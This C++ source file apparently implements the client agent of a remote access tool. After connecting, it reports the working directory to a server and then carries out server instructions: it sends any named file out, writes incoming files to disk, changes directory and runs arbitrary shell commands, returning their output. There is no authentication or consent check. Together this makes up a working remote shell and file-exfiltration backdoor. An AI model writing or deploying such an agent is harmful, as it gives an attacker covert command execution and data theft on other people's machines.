#include "Agent.h"

void Agent::OnConnect(Connection connection)
{
	Packet packet;

	packet.InsertString(command.GetCurrentDir());
	connection.Send(packet);
}


bool Agent::ShutDown()
{
	if (not connSocket.Close())
	{
		std::cerr << "Error at Close." << std::endl;
		return false;
	}
	
	return true;
}

bool Agent::Logic()
{
	Packet packet;

	if (not serverConn.Recv(packet))
	{
		return false;
	}

	PacketType packetType = packet.GetPacketType();

	// shutdown if connectionClose recevied.
	if (packetType == PacketType::ConnectionClose)
		return false;

	std::string cmd = packet.ExtractString();

	// send file request
	if (packetType == PacketType::Integers)
	{
		std::string& filename = cmd;

		// check if file exists
		if (std::filesystem::exists(filename))
		{
			// send the file
			if (not serverConn.SendFile(filename))
			{
				std::cerr << "Error at SendFile" << std::endl;
				return false;
			}

			// exit the function since we sent the file
			return true;
		}

		else
		{
			//clear the paccket and set packet type to invalid since file does not exist
			packet.Clear();
		}

	}

	// file receive request
	else if (packetType == PacketType::Bytes)
	{
		std::string& filename = cmd;
		uint32_t filesize = packet.ExtractInt();

		// receive file
		if (not serverConn.RecvFile(filename, filesize))
		{
			std::cerr << "Error at RecvFile." << std::endl;
			return false;
		}

		// exit the function since we received the file
		return true;
	}
	

	// change current dir
	else if (packetType == PacketType::Pwd)
	{

		std::string newPath = cmd.substr(cmd.find(' ') + 1);

		if (command.SetCurrentDir(newPath))
		{
			packet.Clear();
			packet.InsertString(command.GetCurrentDir() + '\n');
		}

		else
		{
			//clear the paccket and set packet type to invalid since the system cannot find it.
			packet.Clear();
			packet.InsertString(std::string("The system cannot find the path specified.\n"));
		}
		
	}

	// execute command line command
	else
	{
		if (not command.Execute(cmd))
		{
			std::cerr << "Error at Execute" << std::endl;
			return false;
		}

		packet.Clear();
		packet.InsertString(command.GetOutput());
	}

	if (not serverConn.Send(packet))
	{
		std::cerr << "Error at Send (response)." << std::endl;
		return false;
	}

	return true;
}
